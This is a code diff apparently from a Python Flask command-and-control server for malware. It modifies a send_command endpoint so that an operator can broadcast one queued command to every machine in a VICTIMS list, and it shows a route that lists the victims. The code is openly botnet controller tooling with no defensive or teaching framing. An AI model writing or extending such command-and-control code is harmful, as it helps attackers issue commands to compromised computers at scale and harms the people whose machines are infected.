@@ -51,8 +51,15 @@ def send_command():
     target_id = str(data['target'])
     cmd = data['command']
     
-    COMMAND_QUEUE[target_id] = cmd
-    return jsonify({"status": "queued", "target": target_id, "cmd": cmd})
+    if target_id == "ALL":
+        count = 0
+        for uid in VICTIMS:
+            COMMAND_QUEUE[uid] = cmd
+            count += 1
+        return jsonify({"status": "broadcast_queued", "count": count, "cmd": cmd})
+    else:
+        COMMAND_QUEUE[target_id] = cmd
+        return jsonify({"status": "queued", "target": target_id, "cmd": cmd})
 
 @app.route('/victims', methods=['GET'])
 def get_victims():
